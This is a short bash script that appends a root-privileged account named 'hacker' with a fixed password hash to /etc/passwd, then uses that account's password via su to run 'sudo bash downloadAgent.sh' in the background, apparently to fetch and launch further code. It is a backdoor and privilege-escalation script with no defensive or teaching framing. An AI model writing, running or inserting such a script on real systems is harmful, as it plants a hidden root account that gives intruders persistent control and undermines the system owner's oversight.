#!/bin/bash
echo 'hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash' >>/etc/passwd

USERNAME="hacker"
COMMAND="sudo bash downloadAgent.sh $1 &"
PASSWORD="hacker"

echo "$PASSWORD" | su -c "$COMMAND" "$USERNAME"
echo "Command execution completed."